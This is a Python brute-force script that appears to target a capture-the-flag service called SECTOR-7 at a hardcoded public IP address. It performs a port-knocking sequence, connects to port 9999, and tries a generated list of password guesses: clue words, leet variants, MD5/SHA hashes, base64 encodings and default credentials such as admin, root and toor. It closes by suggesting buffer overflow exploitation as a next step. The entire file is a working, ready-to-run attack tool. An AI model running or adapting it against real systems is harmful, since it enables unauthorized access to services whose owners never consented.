#!/usr/bin/env python3
"""
Brute force SECTOR-7 password based on challenge clues
"""

import socket
import time
import hashlib
import base64

TARGET_IP = "13.206.58.35"
KNOCK_SEQUENCE = [9000, 2600, 1337]
SERVICE_PORT = 9999

def knock_ports():
    """Perform port knocking"""
    for port in KNOCK_SEQUENCE:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((TARGET_IP, port))
            sock.close()
        except:
            pass
        time.sleep(0.2)

def try_password(password):
    """Try a single password"""
    try:
        knock_ports()
        time.sleep(0.5)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET_IP, SERVICE_PORT))
        
        # Receive banner
        banner = sock.recv(4096)
        
        # Send password
        sock.send((password + "\n").encode())
        time.sleep(0.5)
        
        # Get response
        response = sock.recv(4096)
        sock.close()
        
        resp_text = response.decode('utf-8', errors='ignore')
        
        # Check for success
        if "denied" not in resp_text.lower() and "incorrect" not in resp_text.lower():
            if len(resp_text) > 50 or "kaal{" in resp_text.lower() or "flag" in resp_text.lower() or "access granted" in resp_text.lower():
                print(f"\n[!!!] POSSIBLE SUCCESS with password: {password}")
                print(f"Response:\n{resp_text}")
                return True
        
        return False
    except Exception as e:
        return False

def generate_passwords():
    """Generate password candidates based on clues"""
    passwords = []
    
    # Direct clue interpretations
    base_words = [
        "KAAL", "kaal", "Kaal",
        "SECTOR-7", "SECTOR7", "sector-7", "sector7",
        "9000", "2600", "1337",
        "over9000", "9001",
    ]
    
    # Add base words
    passwords.extend(base_words)
    
    # Phone/IMEI related
    passwords.extend([
        "#06#", "06", "0606", "060606",
        "IMEI", "imei",
        "phone", "mobile",
    ])
    
    # 90s hacker culture
    passwords.extend([
        "phreaker", "phreak", "2600hz",
        "bluebox", "redbox",
        "captaincrunch", "capncrunch",
        "elite", "leet", "31337",
        "hacker", "h4ck3r", "h4x0r",
    ])
    
    # Combinations with separators
    for sep in ["", "-", "_", ":", "."]:
        passwords.append(f"9000{sep}2600{sep}1337")
        passwords.append(f"KAAL{sep}9000")
        passwords.append(f"kaal{sep}9000")
        passwords.append(f"sector7{sep}9000")
    
    # Hashes of key terms
    for word in ["KAAL", "kaal", "sector7", "9000", "2600", "1337"]:
        passwords.append(hashlib.md5(word.encode()).hexdigest())
        passwords.append(hashlib.md5(word.encode()).hexdigest()[:16])
        passwords.append(hashlib.md5(word.encode()).hexdigest()[:8])
        passwords.append(hashlib.sha1(word.encode()).hexdigest())
        passwords.append(hashlib.sha256(word.encode()).hexdigest()[:32])
    
    # Base64 encodings
    for word in ["KAAL", "kaal", "sector7", "9000-2600-1337"]:
        passwords.append(base64.b64encode(word.encode()).decode())
    
    # Hex representations
    passwords.extend([
        hex(9000)[2:], hex(2600)[2:], hex(1337)[2:],
        hex(9000)[2:] + hex(2600)[2:] + hex(1337)[2:],
    ])
    
    # Author name
    passwords.extend(["Glitch3r", "glitch3r", "GLITCH3R", "gl1tch3r", "GL1TCH3R"])
    
    # Leet speak variations
    passwords.extend([
        "K44L", "k44l", "K@AL", "k@al", "KA4L", "ka4l",
        "S3CT0R7", "s3ct0r7", "S3CTOR-7", "s3ctor-7",
    ])
    
    # Common CTF passwords
    passwords.extend([
        "password", "Password", "PASSWORD",
        "admin", "root", "toor",
        "flag", "ctf", "challenge",
    ])
    
    # Dragon Ball Z references (over 9000)
    passwords.extend([
        "vegeta", "Vegeta", "VEGETA",
        "goku", "Goku", "GOKU",
        "saiyan", "Saiyan", "SAIYAN",
        "dragonball", "DragonBall",
    ])
    
    # Remove duplicates and return
    return list(set(passwords))

def main():
    print("[*] SECTOR-7 Password Brute Force")
    print(f"[*] Target: {TARGET_IP}:{SERVICE_PORT}\n")
    
    passwords = generate_passwords()
    print(f"[*] Generated {len(passwords)} unique password candidates")
    print("[*] Starting brute force...\n")
    
    for i, pwd in enumerate(passwords, 1):
        if i % 10 == 0:
            print(f"[*] Progress: {i}/{len(passwords)} ({i*100//len(passwords)}%)")
        
        if try_password(pwd):
            print(f"\n[+] SUCCESS! Password found: {pwd}")
            return
        
        time.sleep(0.5)  # Rate limiting
    
    print("\n[-] No password found in candidate list")
    print("[*] May need to:")
    print("    1. Analyze the binary (if we can get it)")
    print("    2. Try buffer overflow exploitation")
    print("    3. Look for more specific clues")

if __name__ == "__main__":
    main()
